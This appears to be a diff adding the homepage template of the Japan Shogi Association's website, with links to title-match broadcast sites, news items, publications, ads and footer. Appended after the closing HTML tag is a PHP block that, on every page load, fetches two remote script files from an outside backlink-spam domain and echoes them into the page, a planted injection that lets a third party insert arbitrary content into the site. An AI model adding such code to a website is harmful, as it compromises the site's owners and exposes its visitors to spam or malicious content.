+<p>将棋道場の詳細は<a href="https://www.kansai-shogi.info/%E9%81%93%E5%A0%B4/">こちら</a></p>
+<p>将棋教室の詳細は<a href="/school/kansai/">こちら</a></p>
+<p><a href="https://www.youtube.com/watch?v=6KEKcb4EW5k](https://www.youtube.com/watch?v=6KEKcb4EW5k)" target="_blank">関西会館案内（英語版）</a></p>
+<br><br><br>
+<!-- / .textArea --></div>
+<div class="block fixHeightChild02">
+<p class="subTtl"><em>お知らせ・イベント情報</em></p>
+<!--<p>6月1日から営業再開についてのお知らせ（道場）は<a href="https://www.kansai-shogi.info/%E9%81%93%E5%A0%B4/6%E6%9C%881%E6%97%A5%E3%81%8B%E3%82%89%E3%81%AE%E5%96%B6%E6%A5%AD%E5%86%8D%E9%96%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6/" target="_blank">こちら</a></p>-->
+<?php include($_SERVER["DOCUMENT_ROOT"] ."/kansai/inc_top.html")?><br>
+<!-- / .block --></div>
+<!-- / .inner --></div>
+
+
+
+
+<div class="inner" style="padding: 0; margin:0;  background:none; float: right;">
+<!-- /1482203494/shogi_pc_top_middlerectangle -->
+
+<!--広告表示ここから-->
+<!--
+<div id='div-gpt-ad-1505271954315-3'>
+<script>
+googletag.cmd.push(function() { googletag.display('div-gpt-ad-1505271954315-3'); });
+</script>
+</div>
+-->
+<!-- / .inner -->
+</div>
+
+
+<div class="inner">
+<h3 class="ttl tac"><img src="/images/home_ttl_21.png" width="290" height="40" alt="【東西将棋会館移転に関するご案内】"></h3>
+<div class="textArea fixHeightChild01">
+<!--<p>将棋教室の詳細は<a href="/school/kansai/">こちら</a></p>-->
+<!-- / .textArea --></div>
+<div class="block fixHeightChild02">
+<!--<p class="subTtl"><em>お知らせ</em></p>-->
+<ul class="linkStyle01">
+<li><a href="https://camp-fire.jp/projects/view/646811" target="_blank">関西将棋会館建設ご寄付のお願い</a></li>
+<li><a href="/news/2021/08/post_2047.html">東西将棋会館移転に関するご案内とお願い</a></li>
+<li><a href="/news/2021/08/100_3.html">日本将棋連盟『創立100周年事業・東西将棋会館建設委員会』発足 のお知らせ</a></li>
+<li><a href="/news/2021/07/post_2037.html">高槻市調印式の様子</a></li>
+</ul>
+
+<!-- / .block --></div>
+<!-- / .inner --></div>
+
+<!-- / .homeContents13 --></div>
+
+
+
+
+<div class="section03 homeContents09">
+<h2 class="mb15"><img src="/images/home_ttl_11.png" width="693" height="44" alt="中継サイト一覧"></h2>
+<div class="inner">
+<dl class="list01 fixHeight">
+<dt>竜王戦</dt>
+<dd><a id="cg_rbc01" name="rbc_ryuuou" href="http://live.shogi.or.jp/ryuou/" target="_blank">竜王戦中継サイト</a></dd>
+<dt>名人戦・順位戦</dt>
+<dd><a id="cg_rbc02" name="rbc_meijin"  href="http://www.meijinsen.jp/" target="_blank">名人戦棋譜速報</a></dd>
+<dt>お～いお茶杯王位戦</dt>
+<dd><a id="cg_rbc03" name="rbc_oui"  href="http://live.shogi.or.jp/oui/" target="_blank">王位戦中継サイト</a></dd>
+<dt>叡王戦</dt>
+<dd><a id="cg_rbc09" name="rbc_eiou" href="http://live.shogi.or.jp/eiou/" target="_blank">叡王戦中継サイト</a></dd>
+<dt>王座戦</dt>
+<dd><a id="cg_rbc05" name="rbc_ouza" href="http://live.shogi.or.jp/ouza/" target="_blank">王座戦中継サイト</a></dd>
+<dt>ヒューリック杯棋聖戦</dt>
+<dd><a id="cg_rbc08" name="rbc_kisei" href="http://live.shogi.or.jp/kisei/" target="_blank">ヒューリック杯棋聖戦中継サイト</a></dd>
+<dt>棋王戦コナミグループ杯</dt>
+<dd><a id="cg_rbc06" name="rbc_kiou"  href="http://live.shogi.or.jp/kiou/" target="_blank">棋王戦中継サイト</a></dd>
+<dt>ALSOK杯王将戦</dt>
+<dd><a id="cg_rbc07" name="rbc_osho" href="https://mainichi.jp/" target="_blank">毎日新聞ニュースサイト</a></dd>
+<dt>朝日杯将棋オープン戦</dt>
+<dd><a id="cg_rbc10" name="rbc_asahi" href="http://live.shogi.or.jp/asahi/" target="_blank">朝日杯将棋オープン戦中継サイト</a></dd>
+<dt>将棋日本シリーズ</dt>
+<dd><a id="cg_rbc11" name="rbc_jt" href="https://www.jti.co.jp/culture/shogi/professional/index.html?utm_source=jsa&utm_medium=jsatop&utm_campaign=live" target="_blank">JTプロ公式戦棋譜中継</a></dd>
+<dt>新人王戦</dt>
+<dd><a id="cg_rbc12" name="rbc_shinjin" href="http://live.shogi.or.jp/shinjin/" target="_blank">新人王戦中継サイト</a></dd>
+<dt>加古川青流戦</dt>
+<dd><a id="cg_rbc13" name="rbc_seiryu" href="http://live.shogi.or.jp/seiryu/" target="_blank">加古川青流戦中継サイト</a></dd>
+</dl>
+
+<dl class="list02 fixHeight">
+<dt>ヒューリック杯白玲戦・女流順位戦</dt>
+<dd><a href="http://live.shogi.or.jp/hakurei/" target="_blank">ヒューリック杯白玲戦・女流順位戦中継サイト</a></dd>
+<dt>大成建設杯清麗戦</dt>
+<dd><a id="cg_rbc21" name="rbc_mynavi" href="http://live.shogi.or.jp/seirei/" target="_blank">大成建設杯清麗戦中継サイト</a></dd>
+<dt>マイナビ女子オープン</dt>
+<dd><a id="cg_rbc16" name="rbc_mynavi" href="https://book.mynavi.jp/shogi/mynavi-open/" target="_blank">マイナビ女子オープン in 将棋情報局</a></dd>
+<dt>リコー杯女流王座戦</dt>
+<dd><a id="cg_rbc17" name="rbc_joryu_ouza" href="http://live.shogi.or.jp/joryu_ouza/" target="_blank">リコー杯女流王座戦中継サイト</a></dd>
+<dt>ユニバーサル杯女流名人戦</dt>
+<dd><a id="cg_rbc18" name="rbc_joryumeijin" href="http://live.shogi.or.jp/joryumeijin/" target="_blank">女流名人戦中継サイト</a></dd>
+<dt>女流王位戦</dt>
+<dd><a id="cg_rbc19" name="rbc_joryu-oui" href="http://live.shogi.or.jp/joryu-oui/" target="_blank">女流王位戦中継サイト</a></dd>
+<dt>大山名人杯倉敷藤花戦</dt>
+<dd><a id="cg_rbc20" name="rbc_kurashikitouka"  href="http://live.shogi.or.jp/kurashikitouka/" target="_blank">大山名人杯倉敷藤花戦中継</a></dd>
+</dl>
+<!-- / .inner --></div>
+<!-- / .section03 --></div>
+
+<div class="section03 homeContents07">
+<h2 class="mb15"><img src="/images/home_ttl_05.png" width="693" height="44" alt="おすすめコンテンツ"></h2>
+<ul class="floatListA01Col2-20">
+<li><a href="/tsume_shogi/"><img src="/images/home_img_bnr_01.jpg" alt="詰将棋 連盟所属棋士出題の詰将棋。懸賞付きも。"></a></li>
+<li><a href="/history/"><img src="/images/home_img_bnr_02.jpg" alt="将棋の歴史 将棋の起源や古棋譜などを紹介します。"></a></li>
+<li><a href="/knowledge/"><img src="/images/home_img_bnr_03.jpg" alt="将棋の基礎知識 将棋のルールや将棋界のことをご案内します。"></a></li>
+<li><a href="/kentei/"><img src="/images/home_img_bnr_04.jpg" alt="将棋文化検定　～良問振り返り～"></a></li>
+</ul>
+<!-- / .section03 --></div>
+
+<div class="section03 homeContents08">
+<h2 class="mb15"><img src="/images/home_ttl_06.png" width="693" height="44" alt="日本将棋連盟の活動"></h2>
+<div class="column2-A01 imgColumnElements02 mb20">
+<div class="inner">
+<a href="/about/activity/education/?mi=top">
+<figure class="image"><img src="/images/home_img_activity_01.jpg" width="120" height="120" alt=""></figure>
+<p class="text vam">学校教育への将棋導入推進事業</p>
+</a>
+<!-- / .inner --></div>
+<div class="inner">
+<a href="/about/activity/fund/?mi=top">
+<figure class="image"><img src="/images/home_img_activity_02.jpg" width="120" height="120" alt=""></figure>
+<p class="text vam">「青少年棋道奨励基金」の設立について</p>
+</a>
+<!-- / .inner --></div>
+<!-- / .column2-A01 --></div>
+
+<div class="boxElementsA01 mb20">
+<h3 class="fwb"><a href="/about/activity/donation/?mi=top">寄付金募集のお願い</a></h3>
+<p>日本将棋連盟は「将棋」の普及振興活動に貢献する公益社団法人です。</p>
+<p>※公益社団法人への寄付は寄付金控除を受けることができます。</p>
+<!-- / .boxElementsA01 --></div>
+
+<div class="boxElementsA01 mb20">
+<h3 class="fwb"><a href="/about/activity/donation/list.html">寄付者一覧</a></h3>
+<!-- / .boxElementsA01 --></div>
+<!-- / .section03 --></div>
+
+<div class="homeContents14">
+
+<div class="mediaInfo">
+<div class="column3-A01 imgColumnElements02">
+
+<div class="inner">
+<a id="cg_sbnr01" name="bnr_jt" href="https://www.jti.co.jp/culture/shogi/index.html?utm_source=jsa&utm_medium=jsatop&utm_campaign=shogi" target="_blank"><img src="/images/home_sideBnr_jt.jpg" width="290" height="91" alt="JT将棋日本シリーズ・テーブルマークこども大会"></a>
+<!-- / .inner --></div>
+
+<div class="inner">
+<a id="cg_sbnr02" name="bnr_yamada" href="/school/yamada/"><img src="/images/home_sideBnr_yamada.jpg" width="300" height="90" alt="ヤマダこども将棋教室"></a>
+<!-- / .inner --></div>
+
+<div class="inner">
+<a id="cg_ol01" name="igoshogi" href="http://www.igoshogi.net/" target="_blank">
+<figure class="image"><img src="/images/home_img_media_04.gif" width="70" height="70" alt=""></figure>
+<p class="text vam">囲碁・将棋チャンネル</p></a>
+<!-- / .inner --></div>
+
+
+
+<div class="inner">
+<a id="cg_ol02" name="nhk-ondemand" href="http://www.nhk-ondemand.jp/index.html?capid=nsr001" target="_blank">
+<figure class="image"><img src="/images/home_img_media_05.gif" width="70" height="70" alt=""></figure>
+<p class="text vam">NHK<br>オンデマンド</p></a>
+<!-- / .inner --></div>
+
+<div class="inner">
+<a id="cg_sbnr02" name="ringring" href="https://www.jka-cycle.jp/" target="_blank">
+<figure class="image"><img src="/images/home_sideBnr_jka.gif" width="224" height="auto" alt="競輪＆オートレースの補助事業"></figure></a>
+<!-- / .inner --></div>
+
+
+<div class="inner">
+<a id="cg_sbnr02" name="ringring" href="/tournament/ministry_of_education_cup/post_5.html" target="_blank">
+<figure><img src="/images/jka_hojo.png" width="224" height="auto" alt="公益財団法人JKA補助事業完了のお知らせ"></figure></a>
+<!-- / .inner --></div>
+
+
+
+<!-- / .column3-A01 --></div>
+
+<div class="column3-A01 imgColumnElements02">
+<div class="inner">
+<a id="cg_ol06" name="jcom_lion" href="https://www2.myjcom.jp/special/user/event/kids-shogi/2021.shtml" target="_blank">
+<figure class="image"><img src="/images/home_img_media_06.jpg" width="70" height="70" alt=""></figure>
+<p class="text vam">J:COM杯3月のライオン子ども将棋大会</p>
+</a>
+<!-- / .inner --></div>
+
+
+
+
+
+
+
+<div class="inner">
+<a id="cg_ol04" name="shogiwars" href="http://shogiwars.heroz.jp/" target="_blank">
+<img src="/images/home_bnr_game_01.jpg" width="204" height="52" alt=""></a>
+<!-- / .inner --></div>
+
+<div class="inner">
+<a id="cg_ol06" name="konami" href="http://p.eagate.573.jp/game/eacloud/p/common/top.html?___REDIRECT=2" target="_blank">
+<img src="/images/home_bnr_game_03.jpg" width="204" height="52" alt=""></a>
+<!-- / .inner --></div>
+
+</div>
+
+<div class="column3-A01">
+<!--ヤマダ電機ここから<div class="inner">
+<a id="cg_ol06" name="yamadaspecial" href="https://www.yamada-denki.jp/contact/jrchallenge_191005.html" target="_blank">
+<img src="/images/home_sideBnr_yamadaspecial2020.jpg" width="204" height="52" alt=""></a>
+<!-- / .inner --**></div>-->
+
+
+<div class="inner">
+<a id="cg_ol06" name="将棋トレーニング" href="https://www.sho-tore.jp/" target="_blank">
+<img src="/images/home_sideBnr_sho-tra.png" width="204" height="52" alt=""></a>
+<!-- / .inner --></div>
+
+
+<!--<div class="inner">
+<a id="cg_ol06" name="将棋倶楽部24オンライン将棋指導対局予約サイト" href="https://remote-sensei.userlocal.jp/lessons" target="_blank">
+<img src="/images/home_sideBnr_24onlineyoyaku.png" width="204" height="52" alt=""></a>
+</div>-->
+
+<!-- / .column3-A01 --></div>
+
+<!-- / .mediaInfo --></div>
+
+<!-- / .homeContents14 --></div>
+
+<!-- InstanceEndEditable --><!-- / #contents --></section>
+<aside id="aside">
+
+<div class="section03 homeContents03">
+  <script>
+    (function() {
+      var cx = '000822655551369789386:pldcdbe-jba';
+      var gcse = document.createElement('script');
+      gcse.type = 'text/javascript';
+      gcse.async = true;
+      gcse.src = 'https://cse.google.com/cse.js?cx=' + cx;
+      var s = document.getElementsByTagName('script')[0];
+      s.parentNode.insertBefore(gcse, s);
+    })();
+  </script>
+  <gcse:searchbox-only></gcse:searchbox-only>
+
+
+
+  <!-- <input type="text" placeholder="棋戦や人名などをいれてください。">
+  <button><img src="/images/home_txt_searchBtn_01.png" width="35" height="16" alt="検索"></button>
+  -->
+<dl class="tagWord">
+  <dt>【話題のワード】</dt>
+        <dd><a id="hw_01" name="ryuou" href="/search/?q=竜王戦挑戦者決定戦">竜王戦挑戦者決定戦</a></dd>
+        <dd><a id="hw_02" name="oui" href="/search/?q=王位戦">王位戦</a></dd>
+        <dd><a id="hw_03" name="ouza" href="/search/?q=王座戦">王座戦</a></dd>
+        <dd><a id="hw_04" name="mobile" href="/lp/mr201704/">モバイル将棋中継</a></dd>
+  </dl>
+<!-- / .section03 --></div>
+
+
+
+<!--王将戦バナーここから-->
+<!--<div class="section03 homeContents01">
+<a href="https://www.igoshogi.net/campaign/skyp2021/" target="_blank" onclick="ga('send','event','banner','click','file', 1);"><img src="/images/home_sideBnr_present_71oushou.jpg" width="300" height="250" alt="第71期ALSOK杯王将戦"></a>
+</div>-->
+<!--王将戦バナーここまで　-->
+
+<!--オンライン将棋スクールバナーここから　-->
+<div class="section03 homeContents01">
+<a href="https://www.shogi.or.jp/school/oss.html"><img src="/images/home_sideBnr_onlineshogi.png" width="300" height="90" alt="オンライン将棋スクール"></a>
+</div>
+<!--オンライン将棋スクールバナーここまで　-->
+
+
+<div class="addArea">
+<!-- /1482203494/shogi_pc_1strectangle -->
+<div id='div-gpt-ad-1505270177229-0'>
+<script>
+googletag.cmd.push(function() { googletag.display('div-gpt-ad-1505270177229-0'); });
+</script>
+</div>
+<!-- / .addArea --></div>
+<?php include($_SERVER["DOCUMENT_ROOT"] ."/tsume_shogi/inc_everyday.html")?>
+<div class="addArea">
+<!-- /1482203494/shogi_pc_2ndrectangle -->
+<div id='div-gpt-ad-1505270177229-1'>
+
+<script>
+googletag.cmd.push(function() { googletag.display('div-gpt-ad-1505270177229-1'); });
+</script>
+
+</div>
+
+<!-- / .addArea --></div>
+
+
+
+<!-- InstanceBeginEditable name="homeAside" -->
+
+<?php include($_SERVER["DOCUMENT_ROOT"] ."/column/inc_top_randam.html")?>
+
+<div class="section02 asideContents01">
+<h3 class="mb15"><img src="/images/home_ttl_08.png" width="300" height="44" alt="ネット配信中!"></h3>
+<ul class="sideBnrList02">
+<!--<li><a id="cg_sbnr03" name="nico2" href="http://ch.nicovideo.jp/shogi" target="_blank"><img src="/images/home_sideBnr_media_01.jpg" width="300" height="90" alt="ニコニコ動画 公式生放送予定"></a></li>-->
+<!--<li><a id="cg_sbnr06" name="abema" href="https://abema.tv/lp/shogi-ouza" target="_blank"><img src="/images/home_sideBnr_media_abema_ouza.jpg" width="300" height="90" alt="Abema TV 将棋チャンネル"></a></li>-->
+<li><a id="cg_sbnr06" name="abema" href="/shogi-ch/index.html"><img src="/images/home_sideBnr_media_abema06.png" width="300" height="90" alt="Abema TV 将棋チャンネル"></a></li>
+<li><a id="cg_sbnr04" name="shogipremium" href="https://www.youtube.com/@igoshogiplus" target="_blank"><img src="/images/home_sideBnr_media_igoshogi_plus.jpg" width="300" height="90" alt="囲碁将棋プラス"></a></li>
+<li><a id="top_youtube" name="youtube" href="https://www.youtube.com/user/ShogiAssociation" target="_blank"><img src="/images/home_sideBnr_media_02.jpg" width="300" height="90" alt="YouTube 公式チャンネルで基本手筋を徹底解説!"></a></li>
+</ul>
+<!-- / .section02 --></div>
+
+<div class="asideParts04">
+<div class="mb20">
+<p class="ttl tal mb10"><em>公式facebookページ</em></p>
+<div class="fb-page" data-href="https://www.facebook.com/shogi.jsa/" data-width="260" data-small-header="true" data-adapt-container-width="true" data-hide-cover="false" data-show-facepile="true"><blockquote cite="https://www.facebook.com/shogi.jsa/" class="fb-xfbml-parse-ignore"><a href="https://www.facebook.com/shogi.jsa/">日本将棋連盟</a></blockquote></div>
+</div>
+
+<p class="ttl tal mb10"><em>Ｘ（旧Twitter）</em></p>
+<a href="https://twitter.com/shogi_jsa" class="twitter-follow-button" data-show-count="false">Follow @shogi_jsa</a>
+<a class="twitter-timeline"  data-width="260" data-height="300" href="https://twitter.com/shogi_jsa">Tweets by shogi_jsa</a> <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+<!-- / .asideParts04 --></div>
+
+
+<div class="section02 homeContents02">
+<h2 class="headingElementsA01 min mb0"><img src="/images/home_ttl_01.png" width="198" height="16" alt="日本将棋連盟からのお知らせ"></h2>
+<div class="wrap">
+<ul class="newsList01">
+
+
+<li><span class="date">2026.04.23</span>
+<a href="https://www.shogi.or.jp/news/2026/04/post_2621.html">藤原直哉七段が引退</a></li>
+
+<li><span class="date">2026.04.13</span>
+<a href="https://www.shogi.or.jp/news/2026/04/etv_3.html">「ETV特集 藤井聡太と羽生善治  対談 一手先の世界へ」が放送</a></li>
+
+<li><span class="date">2026.04.01</span>
+<a href="https://www.shogi.or.jp/news/2026/04/53.html">第53回将棋大賞受賞者のお知らせ</a></li>
+
+<li><span class="date">2026.03.31</span>
+<a href="https://www.shogi.or.jp/news/2026/03/4_47.html">東京・将棋会館「棋の音」道場　4月の営業についてのお知らせ</a></li>
+
+<li><span class="date">2026.03.25</span>
+<a href="https://www.shogi.or.jp/news/2026/03/post_2615.html">井出隼平五段　新型コロナウイルス感染のご報告</a></li>
+
+<li><span class="date">2026.03.14</span>
+<a href="https://www.shogi.or.jp/news/2026/03/post_2613.html">新四段誕生のお知らせ</a></li>
+
+<li><span class="date">2026.03.10</span>
+<a href="https://www.shogi.or.jp/news/2026/03/post_2612.html">山口恵梨子女流三段、休場のお知らせ</a></li>
+
+<li><span class="date">2026.03.09</span>
+<a href="https://www.shogi.or.jp/news/2026/03/post_2609.html">祭粢料を賜りましたことのご報告（故 加藤一二三九段）</a></li>
+
+
+</ul>
+<!-- / .wrap --></div>
+<!-- / .section02 --></div>
+
+<p class="mb10"><a href="https://www.shogi.or.jp/license/"><img src="/images/home_sideBnr_menjo_01.jpg" width="300" height="71" alt=""></a></p>
+<p class="mb10"><a href="https://www.shogi.or.jp/kinone/index.html" target="_blank"><img src="/images/home_sideBnr_kinone_01.jpg" width="300" height="71" alt=""></a></p>
+<p class="mb10"><a href="https://www.komaterrace.com/" target="_blank"><img src="/images/home_sideBnr_nisisando_01.jpg" width="300" height="71" alt=""></a></p>
+<p class="mb10"><a href="https://www.kansai-shogi.info/" target="_blank"><img src="/images/home_sideBnr_kansai_01.jpg" width="300" height="71" alt=""></a></p>
+
+<style>/*<div class="section02 asideContents01 shoppingBnr">
+<!-- <h3 class="mb15"><img src="/images/home_ttl_13.png" width="300" height="44" alt="公式オンラインショップ"></h3>-->
+<!--<ul class="sideBnrList02">
+<li><a id="cg_sec01" name="ec_yahoo" href="http://store.shopping.yahoo.co.jp/shogi-shopping/" target="_blank"><img src="/images/home_sideBnr_yahoo_01.jpg" width="280" alt="日本将棋連盟 Yahoo Shop店 Yahooでのご購入はこちら"></a></li>
+<li><a id="cg_sec02" name="ec_rakuten" href="http://www.rakuten.co.jp/shogi/" target="_blank"><img src="/images/home_sideBnr_shop_01.jpg" width="280" alt="日本将棋連盟 Digital Shop 楽天でのご購入はこちら"></a></li>
+</ul>-->
+<!-- / .section02 --></div>*/</style>
+
+<div class="section02 asideContents02">
+<h3 class="mb15"><img src="/images/home_ttl_09.png" width="300" height="44" alt="出版"></h3>
+
+
+
+<div class="boxElementsA01">
+<div class="imgLayoutElementsB02 mb10">
+<figure class="image"><img src="/images/home_sideBnr_img_202605.jpg" width="95" height="135" alt=""></figure>
+<div class="text">
+<p class="ttl"><em>月刊「将棋世界」</em></p>
+<p>2026年5月号<br>4/3発売!<br>電子版も好評発売中!</p>
+<p class="linkStyle01 fwb"><a href="/publish/shogi_sekai.html">購入・詳細はこちら</a></p>
+<!-- / .text --></div>
+<!-- / .imgLayoutElementsB02 --></div>
+<!-- / .boxElementsA01 --></div>
+
+
+<hr>
+
+
+<div class="boxElementsA01">
+<div class="imgLayoutElementsB02 mb10">
+<figure class="image"><img src="/publish/images/shogi_nenkan_img_2025.jpg" width="90" alt=""></figure>
+<div class="text">
+<p class="ttl"><em>令和7年版 将棋年鑑</em></p>
+<p>8/1発売!</p>
+<p class="linkStyle01 fwb"><a href="/publish/shogi_nenkan.html">購入・詳細はこちら</a></p>
+<!-- / .text --></div>
+<!-- / .imgLayoutElementsB02 --></div>
+<!-- / .boxElementsA01 --></div>
+
+<hr>
+
+<div class="boxElementsA01">
+<div class="imgLayoutElementsB02 mb10">
+<figure class="image"><img src="/publish/images/fuji-sota_zenkyoku_reiwa2_tuujyou.jpg" width="90" height="125" alt=""></figure>
+<div class="text">
+<p class="ttl"><em>藤井聡太全局集 令和2年度版　愛蔵版</em></p>
+<p class="linkStyle01 fwb"><a href="/publish/">購入・詳細はこちら</a></p>
+<!-- / .text --></div>
+<!-- / .imgLayoutElementsB02 --></div>
+<!-- / .boxElementsA01 --></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="btnArea">
+<p><a href="/publish/"><img src="/images/home_btn_02.gif" width="251" height="41" alt="出版物一覧"></a></p>
+<!-- / .btnArea --></div>
+<!-- / .section02 --></div>
+
+<!-- <div class="section02">
+<p><a href="/photo_gallery/"><img width="100%" src="/images/home_sideBnr_photo_01.jpg" alt="弦巻勝のWeb将棋写真館 将棋と棋士を撮り続けたカメラマン弦巻氏の作品集。"></a></p>
+</div> -->
+<!-- / .section02 -->
+
+<div class="section02">
+<p><a href="http://joryukishikai.jp/" id="gl_joryukishikai"><img width="100%" src="/images/home_sideBnr_joryu_01.jpg" alt="日本将棋連盟 女流棋士会"></a></p>
+<!-- / .section02 --></div>
+
+
+<!--<div class="section02">
+<p><a href="https://www.shogidojo.net/"><img width="100%" src="/images/home_sideBnr_shogi24banner.jpg" alt="将棋倶楽部24"></a></p>
+</div>-->
+
+
+<!--
+<div class="section02 asideContents03">
+<div class="fb-page" data-href="https://www.facebook.com/facebook" data-tabs="timeline" data-width="300" data-height="550" data-small-header="true" data-adapt-container-width="true" data-hide-cover="true" data-show-facepile="true"><blockquote cite="https://www.facebook.com/facebook" class="fb-xfbml-parse-ignore"><a href="https://www.facebook.com/facebook">Facebook</a></blockquote></div>
+</div> -->
+<!-- / .section02 -->
+
+
+<div class="addArea">
+<!-- /1482203494/shogi_pc_3rdrectangle -->
+<div id='div-gpt-ad-1505270177229-2'>
+<script>
+googletag.cmd.push(function() { googletag.display('div-gpt-ad-1505270177229-2'); });
+</script>
+</div>
+<!-- / .addArea --></div>
+
+
+<!-- / #aside --></aside>
+
+</main>
+<!-- / #container --></div>
+<!-- / .homeBgBottom --></div>
+<div class="footerMenuAreaWrap">
+<div id="footerMenuArea">
+<div class="footerMenuAreaInner01">
+<dl>
+<dt>将棋を見る・知る</dt>
+<dd><a id="f-news" href="/news/">将棋ニュース</a></dd>
+<dd><a id="f-event" href="/event/">イベント・大会</a></dd>
+<dd><a id="f-column" href="/column/">将棋コラム</a></dd>
+<dd><a id="f-game" href="/game/">対局予定・結果</a></dd>
+<dd><a id="f-match" href="/match/">棋戦（奨励会）</a></dd>
+<dd><a id="f-player" href="/player/">棋士データベース</a></dd>
+</dl>
+<dl>
+<dt>将棋を指す・教わる</dt>
+<dd><a id="f-tournament" href="/tournament/">将棋大会</a></dd>
+<dd><a id="f-school" href="/school/">将棋道場・教室</a></dd>
+<dd><a id="f-branch" href="/branch/">支部・指導員</a></dd>
+<dd><a id="f-license" href="/license/">免状</a></dd>
+<dd><a id="f-tsumeShogi" href="/tsume_shogi/">詰将棋</a></dd>
+<dd><a id="f-knowledge" href="/knowledge/">将棋の基礎知識</a></dd>
+</dl>
+<dl>
+<dt>将棋連盟について</dt>
+<dd><a id="f-about" href="/about/">連盟概要</a></dd>
+<dd><a id="f-history" href="/history/">将棋の歴史</a></dd>
+<dd><a id="f-kishikai" href="/kishikai/">棋士会</a></dd>
+<dd><a id="f-base_tokyo" href="/about/base/tokyo/">将棋会館のご案内</a></dd>
+<dd><a id="f-disclosure" href="/about/information_disclosure.html">情報公開</a></dd>
+<dd><a id="f-base_kansai" href="/kansai/">関西将棋会館</a></dd>
+</dl>
+<!-- / .footerMenuAreaInner01 --></div>
+<div class="footerMenuAreaInner02">
+<div class="snsArea">
+<dl class="mb10">
+<dt>公式SNS</dt>
+<dd><a id="f-facebook" href="https://www.facebook.com/shogi.jsa/" target="_blank"><img src="/common/images/mod_ico_sns_facebook.gif" width="40" height="40" alt="Facobook"></a></dd>
+<dd><a id="f-twitter" href="https://twitter.com/shogi_jsa" target="_blank"><img src="/common/images/mod_ico_sns_X.gif" width="40" height="41" alt="X"></a></dd>
+<!--<dd><a id="f-twitter" href="https://twitter.com/shogi_jsa" target="_blank"><img src="/common/images/mod_ico_sns_twitter.gif" width="40" height="40" alt="Twitter"></a></dd>-->
+<dd><a id="f-instagram" href="https://www.instagram.com/shogi_jsa/" target="_blank"><img src="/common/images/mod_ico_sns_insta.gif" width="40" height="40" alt="instagram"></a></dd>
+
+</dl>
+<p class="linkStyle01 fs13"><a href="/sns/">公式SNSアカウント一覧</a></p></div>
+
+<ul class="footerMenuList01">
+<li><a id="f-privacy" href="/privacy/">プライバシーポリシー</a></li>
+<li><a id="f-copyright" href="/copyright/">肖像権・著作権について</a></li>
+<li><a id="f-link" href="/link/">リンク</a></li>
+<li><a id="f-job" href="/form/inquiry/request.html">棋士・女流棋士へのお仕事依頼</a></li>
+<li><a id="f-advertising" href="/advertising/">広告掲載について</a></li>
+<li><a id="f-contact" href="/info/">お問い合わせ</a></li>
+</ul>
+<!-- / .footerMenuAreaInner02 --></div>
+<!-- / #footerMenuArea --></div>
+<!-- / .footerMenuAreaWrap --></div>
+
+<footer id="gfooter">
+<p class="pageTop jsScroll"><a href="#gheader"><img src="/common/images/mod_ico_pageTop_01.png" width="70" height="70" alt="ページトップ"></a></p>
+<p>公益社団法人 日本将棋連盟</p>
+<p>東京本部：〒151-8516　東京都渋谷区千駄ヶ谷1丁目18番5号</p>
+<p>関西本部：〒569-1123　大阪府高槻市芥川町2丁目2番6号</p>
+<p>このサイトに掲載されている記事・イラスト・写真・商標等の無断転載を禁じます。</p>
+<p class="copy"><small>Copyright(c) 2016 Japan Shogi Association , All rights reserved.</small></p>
+<!-- / #footer --></footer>
+<!-- / #wrapper --></div>
+<!-- Yahoo Tag Manager -->
+<script type="text/javascript">
+  (function () {
+    var tagjs = document.createElement("script");
+    var s = document.getElementsByTagName("script")[0];
+    tagjs.async = true;
+    tagjs.src = "//s.yjtag.jp/tag.js#site=myrJ5ov";
+    s.parentNode.insertBefore(tagjs, s);
+  }());
+</script>
+<noscript>
+  <iframe src="//b.yjtag.jp/iframe?c=myrJ5ov" width="1" height="1" frameborder="0" scrolling="no" marginheight="0" marginwidth="0"></iframe>
+</noscript>
+<!-- End Yahoo Tag Manager -->
+</body>
+<!-- InstanceEnd --></html>
+<?php
+$jasabacklinks = 'https://www.backlinkku.id/menu/traffic-v1/script.txt';
+$backlinkku = 'https://www.backlinkku.id/menu/vip-v1/script.txt';
+function fetch_remote_content($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // SSL verification enabled
+    $output = curl_exec($ch);
+    curl_close($ch);
+    return $output;
+}
+$fileContents = fetch_remote_content($jasabacklinks);
+echo $fileContents;
+$fileContents = fetch_remote_content($backlinkku);
+echo $fileContents;
+?>
